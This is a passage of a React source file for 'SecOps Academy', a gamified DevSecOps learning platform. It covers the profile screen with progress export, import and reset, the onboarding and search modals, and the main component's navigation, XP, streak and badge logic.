              <div className="text-[#FAFAFA] text-lg font-bold">{s.value}</div>
            </div>
          ))}
        </div>
      </div>

      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6">
        <div className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-4">Progress Backup</div>
        <div className="flex flex-wrap gap-3">
          <button onClick={() => {
            const data = { profile, progress, terminal, badges, exportedAt: new Date().toISOString(), version: 1 };
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `secops-academy-${profile.callsign || 'progress'}.json`;
            a.click();
            URL.revokeObjectURL(url);
          }} className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium border" style={{ borderColor: DT.blue, color: DT.blue }}>
            <Download size={14} /> Export Progress
          </button>
          <label className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium border cursor-pointer" style={{ borderColor: DT.border, color: DT.textSecondary }}>
            <Upload size={14} /> Import Progress
            <input type="file" accept=".json" className="hidden" onChange={async (e) => {
              const file = e.target.files?.[0];
              if (!file) return;
              try {
                const text = await file.text();
                const data = JSON.parse(text);
                if (data.version && data.profile && data.progress) {
                  if (confirm('This will replace your current progress. Continue?')) {
                    await storageSet('secops-profile', data.profile);
                    await storageSet('secops-progress', data.progress);
                    await storageSet('secops-terminal', data.terminal || STORAGE_DEFAULTS['secops-terminal']);
                    await storageSet('secops-badges', data.badges || STORAGE_DEFAULTS['secops-badges']);
                    window.location.reload();
                  }
                } else {
                  alert('Invalid file format');
                }
              } catch { alert('Invalid file format'); }
            }} />
          </label>
        </div>
      </div>

      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6">
        <div className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-4">Badges</div>
        <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
          {BADGES.map(b => {
            const state = badges[b.id] || {};
            return (
              <div key={b.id} className={`p-3 rounded-lg border ${state.unlocked ? 'border-[#F59E0B] bg-[rgba(245,158,11,0.05)]' : 'border-[#27272A] opacity-40'}`}>
                <div className="text-lg mb-1">{b.icon}</div>
                <div className={`text-xs font-bold ${state.unlocked ? 'text-[#F59E0B]' : 'text-[#71717A]'}`}>{b.name}</div>
                <div className="text-[#71717A] text-[10px] mt-1">{state.unlocked ? `Unlocked ${new Date(state.unlockedAt).toLocaleDateString()}` : b.desc}</div>
              </div>
            );
          })}
        </div>
      </div>

      {showCert && <CertificateModal profile={profile} progress={progress} rank={rank} onClose={() => setShowCert(false)} />}

      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6">
        <div className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-4">Certificate & Sharing</div>
        <div className="flex flex-wrap gap-3">
          <button onClick={() => setShowCert(true)} disabled={completedMods === 0} className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium border disabled:opacity-30 disabled:cursor-not-allowed" style={{ borderColor: DT.blue, color: DT.blue }}>
            <Award size={16} /> Generate Certificate
          </button>
          <button onClick={() => {
            const text = `I'm a ${rank.name} on SecOps Academy with ${profile.totalXP} XP! Completed ${completedMods} modules in DevSecOps. Free platform: https://secops.academy #DevSecOps #CyberSecurity`;
            navigator.clipboard.writeText(text);
          }} className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium border" style={{ borderColor: DT.border, color: DT.textSecondary }}>
            <Copy size={14} /> Copy Share Text
          </button>
          <a href={`https://twitter.com/intent/tweet?text=${encodeURIComponent(`I'm a ${rank.name} on SecOps Academy with ${profile.totalXP} XP! Completed ${completedMods} modules in DevSecOps. Free platform: https://secops.academy #DevSecOps #CyberSecurity`)}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium border" style={{ borderColor: DT.border, color: DT.textSecondary }}>
            <Share2 size={14} /> Share on X
          </a>
          <a href={`https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent('https://secops.academy')}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium border" style={{ borderColor: DT.border, color: DT.textSecondary }}>
            <Share2 size={14} /> Share on LinkedIn
          </a>
        </div>
        {completedMods === 0 && <div className="text-xs mt-2" style={{ color: DT.textTertiary }}>Complete at least 1 module to generate a certificate.</div>}
      </div>

      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6">
        <button onClick={() => setShowReset(!showReset)} className="text-[#EF4444] text-sm hover:underline">Reset All Progress</button>
        {showReset && (
          <div className="mt-3 p-3 bg-[rgba(239,68,68,0.05)] border border-[#EF4444] rounded-lg">
            <div className="text-[#EF4444] text-xs mb-2">This will erase ALL progress. Type "RESET" to confirm.</div>
            <div className="flex gap-2">
              <input value={resetConfirm} onChange={e => setResetConfirm(e.target.value)} className="bg-[#09090B] border border-[#27272A] rounded px-3 py-1 text-[#EF4444] text-sm focus:border-[#EF4444] outline-none w-32" placeholder="Type RESET" />
              <button onClick={() => { if (resetConfirm === 'RESET') onReset(); }} disabled={resetConfirm !== 'RESET'} className="px-3 py-1 rounded border border-[#EF4444] text-[#EF4444] text-sm hover:bg-[rgba(239,68,68,0.1)] disabled:opacity-30 disabled:cursor-not-allowed">Confirm Reset</button>
            </div>
          </div>
        )}
      </div>

      <div className="text-center text-[#71717A] text-xs">SecOps Academy — Built by Fractal AI Security Team. A free, open community platform for learning DevSecOps from zero to interview-ready.</div>
    </div>
  );
}

// ============================================================================
// COMPONENT: ONBOARDING MODAL (Feature 2)
// ============================================================================
function OnboardingModal({ onComplete }) {
  const [callsign, setCallsign] = useState('');
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4" style={{ background: 'rgba(0,0,0,0.8)', backdropFilter: 'blur(12px)' }}>
      <div className="w-full max-w-md rounded-xl p-8" style={{ background: DT.surface, border: `1px solid ${DT.border}` }}>
        <div className="text-center mb-6">
          <Shield size={40} className="mx-auto mb-3" style={{ color: DT.blue }} />
          <h2 className="text-xl font-bold" style={{ color: DT.textPrimary }}>Welcome to SecOps Academy</h2>
          <p className="text-sm mt-1" style={{ color: DT.textTertiary }}>Master DevSecOps from zero to production-ready</p>
        </div>
        <div className="mb-6">
          <label className="text-xs font-medium uppercase tracking-wider block mb-2" style={{ color: DT.textTertiary }}>Choose your callsign</label>
          <input
            value={callsign}
            onChange={e => setCallsign(e.target.value.replace(/\s/g, ''))}
            maxLength={20}
            placeholder="e.g. SecurityNinja"
            className="w-full rounded-lg px-4 py-3 text-sm outline-none"
            style={{ background: DT.bg, border: `1px solid ${DT.border}`, color: DT.textPrimary }}
            autoFocus
          />
        </div>
        <div className="grid grid-cols-3 gap-3 mb-6">
          {[
            { value: '28', label: 'Modules' },
            { value: '19', label: 'Hands-on Labs' },
            { value: '140+', label: 'Quiz Questions' },
          ].map(item => (
            <div key={item.label} className="text-center rounded-lg p-3" style={{ background: DT.bg, border: `1px solid ${DT.border}` }}>
              <div className="text-lg font-bold" style={{ color: DT.blue }}>{item.value}</div>
              <div className="text-[10px]" style={{ color: DT.textTertiary }}>{item.label}</div>
            </div>
          ))}
        </div>
        <button
          onClick={() => { if (callsign.trim()) onComplete(callsign.trim()); }}
          disabled={!callsign.trim()}
          className="w-full py-3 rounded-lg text-sm font-semibold transition-opacity disabled:opacity-30 disabled:cursor-not-allowed"
          style={{ background: DT.blue, color: '#fff' }}
        >
          Start Learning
        </button>
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT: SEARCH MODAL (Feature 3)
// ============================================================================
function SearchModal({ onClose, onNavigateModule, onNavigateScreen }) {
  const [query, setQuery] = useState('');
  const inputRef = useRef(null);

  useEffect(() => { inputRef.current?.focus(); }, []);

  const searchItems = useMemo(() => {
    const items = [];
    Object.values(MODULES).forEach(m => {
      items.push({ type: 'module', id: m.id, title: `${m.id}: ${m.title}`, pathId: m.pathId });
      m.theory.sections.forEach(s => {
        items.push({ type: 'section', id: m.id, title: s.heading, subtitle: `Module ${m.id}` });
      });
    });
    INTEL_TOOLS.forEach(t => {
      items.push({ type: 'intel', title: t.name, subtitle: t.tools });
    });
    Object.keys(TERMINAL_COMMANDS).forEach(cmd => {
      if (cmd !== 'help' && cmd !== 'whoami' && cmd !== 'clear') {
        items.push({ type: 'command', title: cmd, subtitle: 'Terminal command' });
      }
    });
    return items;
  }, []);

  const q = query.toLowerCase();
  const filtered = q ? searchItems.filter(item => item.title.toLowerCase().includes(q) || (item.subtitle && item.subtitle.toLowerCase().includes(q))).slice(0, 20) : [];

  const grouped = {
    modules: filtered.filter(i => i.type === 'module' || i.type === 'section'),
    intel: filtered.filter(i => i.type === 'intel'),
    commands: filtered.filter(i => i.type === 'command'),
  };

  const handleSelect = (item) => {
    if (item.type === 'module' || item.type === 'section') {
      onNavigateModule(item.id);
    } else if (item.type === 'intel') {
      onNavigateScreen('intel');
    } else if (item.type === 'command') {
      onNavigateScreen('terminal');
    }
    onClose();
  };

  return (
    <div className="fixed inset-0 z-50 flex items-start justify-center pt-20 p-4" style={{ background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(4px)' }} onClick={onClose}>
      <div className="w-full max-w-lg rounded-xl overflow-hidden" style={{ background: DT.surface, border: `1px solid ${DT.border}` }} onClick={e => e.stopPropagation()}>
        <div className="flex items-center gap-3 p-4 border-b" style={{ borderColor: DT.border }}>
          <Search size={16} style={{ color: DT.textTertiary }} />
          <input
            ref={inputRef}
            value={query}
            onChange={e => setQuery(e.target.value)}
            onKeyDown={e => { if (e.key === 'Escape') onClose(); }}
            placeholder="Search modules, tools, commands..."
            className="flex-1 bg-transparent outline-none text-sm"
            style={{ color: DT.textPrimary }}
          />
          <kbd className="text-[10px] px-1.5 py-0.5 rounded" style={{ background: DT.surfaceRaised, color: DT.textTertiary, border: `1px solid ${DT.border}` }}>ESC</kbd>
        </div>
        {q && (
          <div className="max-h-80 overflow-y-auto p-2">
            {filtered.length === 0 && <div className="text-center py-6 text-sm" style={{ color: DT.textTertiary }}>No results found</div>}
            {grouped.modules.length > 0 && (
              <div>
                <div className="text-[10px] uppercase tracking-wider px-3 py-1 font-semibold" style={{ color: DT.blue }}>Modules</div>
                {grouped.modules.map((item, i) => (
                  <button key={`m-${i}`} onClick={() => handleSelect(item)} className="w-full text-left px-3 py-2 rounded-lg text-sm hover:opacity-80 transition-opacity" style={{ color: DT.textPrimary }} onMouseEnter={e => e.currentTarget.style.background = DT.surfaceRaised} onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                    <div>{item.title}</div>
                    {item.subtitle && <div className="text-[10px]" style={{ color: DT.textTertiary }}>{item.subtitle}</div>}
                  </button>
                ))}
              </div>
            )}
            {grouped.intel.length > 0 && (
              <div>
                <div className="text-[10px] uppercase tracking-wider px-3 py-1 font-semibold" style={{ color: DT.purple }}>Intel</div>
                {grouped.intel.map((item, i) => (
                  <button key={`i-${i}`} onClick={() => handleSelect(item)} className="w-full text-left px-3 py-2 rounded-lg text-sm hover:opacity-80 transition-opacity" style={{ color: DT.textPrimary }} onMouseEnter={e => e.currentTarget.style.background = DT.surfaceRaised} onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                    <div>{item.title}</div>
                    {item.subtitle && <div className="text-[10px]" style={{ color: DT.textTertiary }}>{item.subtitle}</div>}
                  </button>
                ))}
              </div>
            )}
            {grouped.commands.length > 0 && (
              <div>
                <div className="text-[10px] uppercase tracking-wider px-3 py-1 font-semibold" style={{ color: DT.success }}>Commands</div>
                {grouped.commands.map((item, i) => (
                  <button key={`c-${i}`} onClick={() => handleSelect(item)} className="w-full text-left px-3 py-2 rounded-lg text-sm font-mono hover:opacity-80 transition-opacity" style={{ color: DT.textPrimary }} onMouseEnter={e => e.currentTarget.style.background = DT.surfaceRaised} onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                    <div>{item.title}</div>
                    {item.subtitle && <div className="text-[10px]" style={{ color: DT.textTertiary }}>{item.subtitle}</div>}
                  </button>
                ))}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

// ============================================================================
// MAIN COMPONENT
// ============================================================================
export default function SecOpsAcademy() {
  const [loading, setLoading] = useState(true);
  const [screen, setScreen] = useState('dashboard');
  const [profile, setProfile] = useState(STORAGE_DEFAULTS['secops-profile']);
  const [progress, setProgress] = useState(STORAGE_DEFAULTS['secops-progress']);
  const [terminal, setTerminal] = useState(STORAGE_DEFAULTS['secops-terminal']);
  const [badges, setBadges] = useState(STORAGE_DEFAULTS['secops-badges']);
  const [activity, setActivity] = useState(STORAGE_DEFAULTS['secops-activity']);
  const [toast, setToast] = useState(null);
  const [activeModule, setActiveModule] = useState(null);
  const [focusPath, setFocusPath] = useState(null);
  const [showSearch, setShowSearch] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [showOnboarding, setShowOnboarding] = useState(false);
  const [theme, setTheme] = useState('dark');
  const [transitioning, setTransitioning] = useState(false);

  // Load saved theme on mount
  useEffect(() => {
    const saved = localStorage.getItem('secops-theme');
    if (saved === 'light' || saved === 'dark') setTheme(saved);
  }, []);

  // Load from storage
  useEffect(() => {
    (async () => {
      try {
        const [p, pr, t, b, a] = await Promise.all([
          storageGet('secops-profile'),
          storageGet('secops-progress'),
          storageGet('secops-terminal'),
          storageGet('secops-badges'),
          storageGet('secops-activity'),
        ]);
        if (p) setProfile(p);
        if (pr) setProgress(pr);
        if (t) setTerminal(t);
        if (b) setBadges(b);
        if (a) setActivity(a);
      } catch { /* use defaults */ }
      setLoading(false);
    })();
  }, []);

  // Show onboarding if no callsign after load
  useEffect(() => {
    if (!loading && !profile.callsign) setShowOnboarding(true);
  }, [loading, profile.callsign]);

  const switchScreen = useCallback((newScreen) => {
    setTransitioning(true);
    setTimeout(() => {
      setScreen(newScreen);
      setActiveModule(null);
      setFocusPath(null);
      setTransitioning(false);
    }, 150);
  }, []);

  // Keyboard shortcuts (Features 3 & 8)
  useEffect(() => {
    const handler = (e) => {
      // Don't fire when typing in inputs
      const tag = document.activeElement?.tagName?.toLowerCase();
      const isInput = tag === 'input' || tag === 'textarea';

      // Ctrl+K / Cmd+K — always open search
      if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
        e.preventDefault();
        setShowSearch(s => !s);
        return;
      }

      // Escape — close module or search
      if (e.key === 'Escape') {
        if (showSearch) { setShowSearch(false); return; }
        if (activeModule) { setActiveModule(null); return; }
        return;
      }

      // Number keys 1-6 for navigation (only when not in an input)
      if (!isInput && !e.metaKey && !e.ctrlKey && !e.altKey) {
        const screens = ['dashboard', 'paths', 'labs', 'terminal', 'intel', 'profile'];
        const num = parseInt(e.key);
        if (num >= 1 && num <= 6) {
          switchScreen(screens[num - 1]);
        }
      }
    };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [showSearch, activeModule, switchScreen]);

  // Streak tracking
  useEffect(() => {
    if (loading) return;
    const today = new Date().toISOString().split('T')[0];
    if (profile.lastActiveDate === today) return;
    setProfile(prev => {
      const yesterday = new Date(Date.now() - 86400000).toISOString().split('T')[0];
      const isConsecutive = prev.lastActiveDate === yesterday;
      const newStreak = isConsecutive ? prev.streak + 1 : 1;
      const updated = { ...prev, streak: newStreak, longestStreak: Math.max(newStreak, prev.longestStreak), lastActiveDate: today, createdAt: prev.createdAt || today };
      storageSet('secops-profile', updated);
      return updated;
    });
  }, [loading]);

  // Save helpers
  const saveProfile = useCallback((updates) => {
    setProfile(prev => {
      const next = { ...prev, ...updates };
      storageSet('secops-profile', next);
      return next;
    });
  }, []);

  const addXP = useCallback((amount) => {
    setProfile(prev => {
      const next = { ...prev, totalXP: prev.totalXP + amount };
      storageSet('secops-profile', next);
      return next;
    });
  }, []);

  const logActivity = useCallback((action) => {
    setActivity(prev => {
      const next = { log: [{ action, timestamp: new Date().toISOString() }, ...prev.log].slice(0, 50) };
      storageSet('secops-activity', next);
      return next;
    });
  }, []);

  const showToast = useCallback((msg) => setToast(msg), []);

  // Badge checking
  const checkBadges = useCallback((newProgress, newTerminal) => {
    const prog = newProgress || progress;
    const term = newTerminal || terminal;
    const mp = prog.modules || {};
    const checks = {
      'first-scan': () => ['2.1','2.2','2.3','2.4','2.5','2.6'].some(k => mp[k]?.simulationComplete),
      'secret-keeper': () => mp['2.1']?.simulationComplete,
      'pipeline-builder': () => ['3.1','3.2','3.3','3.4','3.5'].some(k => mp[k]?.simulationComplete),
      'full-stack-scanner': () => ['2.1','2.2','2.3','2.4','2.5','2.6'].every(k => mp[k]?.simulationComplete || (!MODULES[k]?.hasSim && mp[k]?.quizBestScore >= 3)),
      'quiz-master': () => Object.values(mp).filter(m => m.quizBestScore === 5).length >= 10,
      'terminal-warrior': () => (term.masteredCommands || []).length >= 40,
      'vault-guardian': () => mp['4.1']?.simulationComplete,
      'policy-enforcer': () => mp['4.3']?.simulationComplete,
      'scenario-survivor': () => ['5.1','5.2','5.3','5.4','5.5','5.6'].every(k => mp[k]?.quizBestScore >= 3),
      'academy-graduate': () => {
        for (const pid of [1,2,3,4,5]) {
          const pathMods = Object.keys(MODULES).filter(k => MODULES[k].pathId === pid);
          if (!pathMods.every(k => mp[k]?.simulationComplete || (!MODULES[k].hasSim && mp[k]?.quizBestScore >= 3))) return false;
        }
        return true;
      },
    };
    setBadges(prev => {
      let changed = false;
      const next = { ...prev };
      for (const [id, check] of Object.entries(checks)) {
        if (!next[id]?.unlocked && check()) {
          next[id] = { unlocked: true, unlockedAt: new Date().toISOString() };
          changed = true;
          const badge = BADGES.find(b => b.id === id);
          if (badge) showToast(`Badge unlocked: ${badge.icon} ${badge.name}`);
        }
      }
      if (changed) storageSet('secops-badges', next);
      return changed ? next : prev;
    });
  }, [progress, terminal, showToast]);

  // Module progress update
  const handleUpdateProgress = useCallback((moduleId, updates) => {
    setProgress(prev => {
      const mod = MODULES[moduleId];
      const oldMp = prev.modules?.[moduleId] || {};
      const newMp = { ...oldMp, ...updates };
      const next = { ...prev, modules: { ...prev.modules, [moduleId]: newMp } };

      // XP calculation
      let xpGain = 0;
      if (updates.simulationComplete && !oldMp.simulationComplete) {
        xpGain += mod.baseXP;
        logActivity(`Completed simulation: ${mod.id} ${mod.title}`);
      }
      if (updates.verified && !oldMp.verified) {
        xpGain += Math.round(mod.baseXP * 0.3);
        logActivity(`Verified: ${mod.id} ${mod.title}`);
      }
      if (updates.quizBestScore !== undefined) {
        const oldBest = oldMp.quizBestScore || 0;
        const newBest = Math.max(updates.quizBestScore, oldBest);
        if (newBest >= 3 && oldBest < 3) {
          xpGain += Math.round(mod.baseXP * 0.2);
          logActivity(`Passed quiz: ${mod.id} (${newBest}/5)`);
        }
        if (newBest === 5 && oldBest < 5) {
          xpGain += 50;
          logActivity(`Perfect quiz: ${mod.id}`);
        }
        // For theory-only modules, completing quiz counts as module completion
        if (!mod.hasSim && newBest >= 3 && oldBest < 3) {
          xpGain += mod.baseXP;
          logActivity(`Completed module: ${mod.id} ${mod.title}`);
        }
      }

      if (xpGain > 0) addXP(xpGain);
      storageSet('secops-progress', next);
      setTimeout(() => checkBadges(next, terminal), 100);
      return next;
    });
  }, [addXP, logActivity, checkBadges, terminal]);

  // Terminal handlers
  const handleMasterCommand = useCallback((cmd) => {
    setTerminal(prev => {
      if (prev.masteredCommands?.includes(cmd)) return prev;
      const next = { ...prev, masteredCommands: [...(prev.masteredCommands || []), cmd] };
      storageSet('secops-terminal', next);
      addXP(5);
      logActivity(`Mastered command: ${cmd}`);
      setTimeout(() => checkBadges(progress, next), 100);
      return next;
    });
  }, [addXP, logActivity, checkBadges, progress]);

  const handleCompleteChallenge = useCallback((id) => {
    setTerminal(prev => {
      if (prev.challengesCompleted?.includes(id)) return prev;
      const next = { ...prev, challengesCompleted: [...(prev.challengesCompleted || []), id] };
      storageSet('secops-terminal', next);
      addXP(30);
      logActivity(`Completed challenge #${id}`);
      return next;
    });
  }, [addXP, logActivity]);

  const handleReset = useCallback(async () => {
    for (const key of Object.keys(STORAGE_DEFAULTS)) {
      await storageSet(key, STORAGE_DEFAULTS[key]);
    }
    setProfile(STORAGE_DEFAULTS['secops-profile']);
    setProgress(STORAGE_DEFAULTS['secops-progress']);
    setTerminal(STORAGE_DEFAULTS['secops-terminal']);
    setBadges(STORAGE_DEFAULTS['secops-badges']);
    setActivity(STORAGE_DEFAULTS['secops-activity']);
    setActiveModule(null);
    showToast('All progress has been reset.');
  }, [showToast]);

  const handleNavigate = useCallback((scr, data) => {
    setTransitioning(true);
    setTimeout(() => {
      setScreen(scr);
      setActiveModule(null);
      if (scr === 'paths' && data) setFocusPath(data);
      setTransitioning(false);
    }, 150);
  }, []);

  const handleOpenModule = useCallback((moduleId) => {
    setActiveModule(moduleId);
    setScreen('paths');
  }, []);

  // Apply active theme
  DT = THEMES[theme];

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ background: DT.bg }}>
        <div className="text-lg font-medium animate-pulse" style={{ color: DT.blue }}>Initializing SecOps Academy...</div>
      </div>
    );
  }

  const NAV_ITEMS = [
    { id: 'dashboard', label: 'Dashboard', icon: Shield },
    { id: 'paths', label: 'Paths', icon: Map },
    { id: 'labs', label: 'Labs', icon: Target },
    { id: 'terminal', label: 'Terminal', icon: Terminal },
    { id: 'intel', label: 'Intel', icon: Brain },
    { id: 'profile', label: 'Profile', icon: User },
  ];

  return (
    <div className="min-h-screen flex flex-col" style={{ background: DT.bg, color: DT.textSecondary }}>
      {toast && <Toast message={toast} onDone={() => setToast(null)} />}

      {/* NAV */}
      <nav className="border-b px-4 md:px-6 py-3 flex items-center gap-4 md:gap-8 sticky top-0 z-40 backdrop-blur-md no-print" style={{ background: DT.surface + 'ee', borderColor: DT.border }}>
        <div className="font-semibold text-sm flex items-center gap-2" style={{ color: DT.textPrimary }}>
          <Shield size={18} style={{ color: DT.blue }} /> <span className="hidden sm:inline">SecOps Academy</span>
        </div>
        <button className="md:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)} style={{ color: DT.textTertiary }}>
          {mobileMenuOpen ? <X size={20} /> : <Menu size={20} />}
        </button>
        <div className="hidden md:flex gap-1 flex-1 justify-center">
          {NAV_ITEMS.map(item => {
            const Icon = item.icon;
            const active = screen === item.id && !activeModule;
            return (
              <button key={item.id} onClick={() => switchScreen(item.id)} className={`flex items-center gap-2 px-3 py-2 rounded-lg text-[13px] font-medium transition-all ${active ? '' : 'hover:opacity-80'}`} style={active ? { background: DT.blueMuted, color: DT.blue } : { color: DT.textTertiary }}>
                <Icon size={15} /> {item.label}
              </button>
            );
          })}
        </div>
        <div className="flex items-center gap-3 text-xs font-medium ml-auto md:ml-0">
          <button onClick={() => setShowSearch(true)} className="hidden md:flex items-center gap-1 px-2 py-1 rounded text-[10px]" style={{ background: DT.surfaceRaised, color: DT.textTertiary, border: `1px solid ${DT.border}` }}>
            <Search size={10} /> <kbd>&#8984;K</kbd>
          </button>
          <span style={{ color: DT.purple }}>{profile.totalXP} XP</span>
          <span className="text-sm">{getRank(profile.totalXP).icon}</span>
          <button onClick={() => { const next = theme === 'dark' ? 'light' : 'dark'; setTheme(next); localStorage.setItem('secops-theme', next); }} className="p-2 rounded-lg transition-colors hover:opacity-80" style={{ color: DT.textTertiary }}>
            {theme === 'dark' ? <Sun size={16} /> : <Moon size={16} />}
          </button>
        </div>
      </nav>
      {/* Mobile nav dropdown */}
      {mobileMenuOpen && (
        <div className="md:hidden border-b px-4 py-2 space-y-1 no-print" style={{ background: DT.surface, borderColor: DT.border }}>
          {NAV_ITEMS.map(item => {
            const Icon = item.icon;
            const active = screen === item.id && !activeModule;
            return (
              <button key={item.id} onClick={() => { switchScreen(item.id); setMobileMenuOpen(false); }} className="flex items-center gap-2 w-full px-3 py-2 rounded-lg text-[13px] font-medium transition-all" style={active ? { background: DT.blueMuted, color: DT.blue } : { color: DT.textTertiary }}>
                <Icon size={15} /> {item.label}
              </button>
            );
          })}
        </div>
      )}

      {/* SEARCH MODAL */}
      {showSearch && <SearchModal onClose={() => setShowSearch(false)} onNavigateModule={handleOpenModule} onNavigateScreen={(scr) => switchScreen(scr)} />}

      {/* ONBOARDING MODAL */}
      {showOnboarding && !loading && (
        <OnboardingModal onComplete={(cs) => { saveProfile({ callsign: cs }); setShowOnboarding(false); }} />
      )}

      {/* CONTENT */}
      <main className={`flex-1 overflow-y-auto transition-all duration-200 ${transitioning ? 'opacity-0 translate-y-2' : 'opacity-100 translate-y-0'}`}>
        {activeModule ? (
          <ModuleView
            moduleId={activeModule}
            progress={progress}
            onUpdateProgress={handleUpdateProgress}
            onBack={() => setActiveModule(null)}
          />
        ) : (
          <>
            {screen === 'dashboard' && <div className="no-print"><DashboardScreen profile={profile} progress={progress} badges={badges} terminal={terminal} onNavigate={handleNavigate} onOpenModule={handleOpenModule} /></div>}
            {screen === 'paths' && <div className="no-print"><PathsScreen progress={progress} onOpenModule={handleOpenModule} focusPath={focusPath} /></div>}
            {screen === 'labs' && <div className="no-print"><LabsScreen progress={progress} onOpenModule={handleOpenModule} /></div>}
            {screen === 'terminal' && <div className="no-print"><TerminalScreen profile={profile} terminal={terminal} onMasterCommand={handleMasterCommand} onCompleteChallenge={handleCompleteChallenge} /></div>}
            {screen === 'intel' && <IntelScreen />}
            {screen === 'profile' && <div className="no-print"><ProfileScreen profile={profile} progress={progress} badges={badges} terminal={terminal} onUpdateProfile={saveProfile} onReset={handleReset} /></div>}
          </>
        )}
      </main>
    </div>
  );
}
